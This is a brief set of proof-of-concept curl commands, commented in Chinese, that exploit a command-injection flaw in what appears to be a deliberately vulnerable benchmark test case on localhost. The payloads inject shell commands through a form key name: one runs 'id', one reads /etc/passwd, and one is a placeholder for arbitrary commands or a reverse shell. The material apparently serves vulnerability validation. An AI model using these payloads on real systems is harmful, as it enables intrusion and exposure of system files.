# PoC 1: 执行 id 命令
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00431' \
  -d ';id;=BenchmarkTest00431'

# PoC 2: 读取 /etc/passwd
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00431' \
  -d ';cat /etc/passwd;=BenchmarkTest00431'

# PoC 3: 反弹 shell 或任意命令
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00431' \
  -d ';任意命令;=BenchmarkTest00431'

# 原理：表单键名（payload）被取为 param → 拼入 "sh -c echo {param}" → shell=True 执行
# 最终执行的命令形如: sh -c echo ;id; （即执行 echo 后执行 id）